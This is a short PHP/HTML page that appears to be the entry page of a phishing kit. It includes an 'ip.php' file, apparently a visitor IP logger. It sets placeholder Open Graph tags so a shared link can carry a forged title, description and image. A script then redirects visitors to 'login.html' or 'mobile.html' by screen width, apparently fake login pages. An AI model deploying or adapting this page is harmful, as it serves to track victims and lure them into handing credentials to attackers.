<?php
include "ip.php";
?>

<!DOCTYPE html>
<html>
<head>
  <meta property="og:title" content="#titleToPreview">
  <meta property="og:description" content="#descToPreview">
  <meta property="og:image" content="#imageToPreview">
</head>
<body>
  <script type="text/javascript">
    if (screen.width <= 699) {
      document.location = "mobile.html";
    } else {
      document.location = "login.html";
    }
  </script>
</body>
</html>